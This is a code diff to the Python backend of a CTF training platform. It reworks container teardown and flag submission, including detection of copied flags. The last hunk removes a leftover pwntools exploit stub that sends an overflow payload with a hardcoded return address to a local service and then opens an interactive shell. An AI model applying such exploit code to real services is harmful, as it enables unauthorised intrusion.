@@ -1,18 +1,17 @@
-import json
 import random
 import string
+import time
 from datetime import datetime, timedelta
 
 import docker
-from docker import errors as docker_error
-from flask import Blueprint, render_template, request, make_response, g, redirect, send_from_directory
+from docker.errors import NotFound
+from flask import Blueprint, render_template, request, make_response, g, send_from_directory
 from sqlalchemy import func, desc
 from werkzeug.security import check_password_hash, generate_password_hash
 
 from app import db, scheduler
-from app.api.docker.service import user_compose_down, user_compose_up, start_docker_resource
+from app.api.docker.service import start_docker_resource
 from app.api.frontend import services
-from app.api.sys.service import get_config_val
 from app.lib.decorators import login_required, user_required
 from app.lib.rest_response import fail, success
 from app.lib.tools import get_ip
@@ -21,9 +20,7 @@ from app.models.admin import Notice, Config
 from app.models.ctf import ImageResource, CtfResource, Answer, Question, Attachment
 from app.api.docker import task
 from app.models.user import User
-from app.tasks.ctf import finish_container
 import logging
-from docker.errors import APIError
 
 from config import config
 
@@ -277,8 +274,9 @@ def challenge_detail(question):
                 "url": "http://{}:{}".format(config.IP, port),
                 "origin": origin
             })
+
         container_data = {
-            "timeout": Config.get_config(Config.KEY_CTF_TIMEOUT),
+            "timeout": (resource.destroy_time - resource.date_created).total_seconds(),
             "create_time": resource.date_created.strftime("%Y-%m-%d %H:%M:%S"),
             "urls": urls,
         }
@@ -376,11 +374,19 @@ def question_destroy(question):
     instance = db.session.query(Question).get(question)
     if not instance.active_flag:
         return fail("静态题库无需动态生成")
-    resources = db.session.query(CtfResource).filter(CtfResource.question_id == instance.id,
-                                                     CtfResource.user_id == g.user.id)
-    for resource in resources:
-        scheduler.add_job(f"task.delay_compose_down", task.delay_compose_down, args=(resource.compose_runner_id,))
-        resource.delete()
+    ctf_resources = db.session.query(CtfResource).filter(CtfResource.question_id == instance.id,
+                                                         CtfResource.user_id == g.user.id)
+    for ctf_resource in ctf_resources:
+        client = docker.DockerClient(Config.get_config(Config.KEY_DOCKER_API))
+        try:
+            container = client.containers.get(ctf_resource.docker_runner.container_id)
+            container.stop()
+            container.remove()
+        except NotFound:
+            continue
+        finally:
+            ctf_resource.delete()
+            ctf_resource.docker_runner.delete()
     return success()
 
 
@@ -408,11 +414,36 @@ def challenge_submit():
     data = request.get_json()
     question_id = data.get("id")
     flag = data.get("flag")
-    code, msg = services.submit(question_id, flag, g.user, ip=ip)
-    if code:
-        return fail(code, msg)
+    # 判断是否有提交记录
+    challenge = Question.get_by_id(question_id)
+    answer = db.session.query(Answer).filter(Answer.question_id == question_id, Answer.status == Answer.status_ok,
+                                             Answer.user_id == g.user.id).count()
+    if answer:
+        return fail(msg="请勿重复提交")
+    #  判断是否是别人的答案
+    copy_resource = db.session.query(CtfResource).filter(CtfResource.flag == flag,
+                                                         CtfResource.user_id != g.user.id).one_or_none()
+    if copy_resource:
+        # todo 添加作弊记录
+        Answer.create(question_id=question_id, user_id=g.user.id, flag=flag, ip=ip, status=Answer.status_cheat)
+        return fail(msg="检测到作弊、本次答题无效!")
+    if challenge.active_flag:
+        current_ctf_resource = db.session.query(CtfResource).filter(CtfResource.user_id == g.user.id,
+                                                                    CtfResource.question_id == question_id).order_by(
+            CtfResource.date_modified.desc()).first()
+        if current_ctf_resource:
+            ok_flag = current_ctf_resource.flag
+        else:
+            return fail(msg="当前状态无法作答、请启动环境!")
     else:
-        return success(msg=msg)
+        ok_flag = challenge.flag
+    if ok_flag == flag:
+        Answer.create(question_id=question_id, user_id=g.user.id, flag=flag, ip=ip, status=Answer.status_ok,
+                      score=challenge.score)
+        return success(msg="答案正确、获得{}积分".format(challenge.score))
+    else:
+        Answer.create(question_id=question_id, user_id=g.user.id, flag=flag, ip=ip, status=Answer.status_error)
+        return fail(msg="答案错误")
 
 
 @bp.get('notice')
@@ -441,22 +472,6 @@ def score_rank():
         积分排行
     """
     # 公告
-    code, data = RankService.score_rank(**request.args)
+    code, data = services.score_rank(**request.args)
     return success(data=data)
 
-
-if __name__ == "__main__":
-    from pwn import *
-
-    context.log_level = 'debug'
-
-    # p = process('./f4n_pwn')
-    p = remote('127.0.0.1', 9999)
-
-    p.recvuntil('length : ')
-    p.sendline('-1')
-    payload = 'a' * 0x57 + p32(0x080486BB)
-    p.recvuntil('name : \n')
-    p.sendline(payload)
-
-    p.interactive()
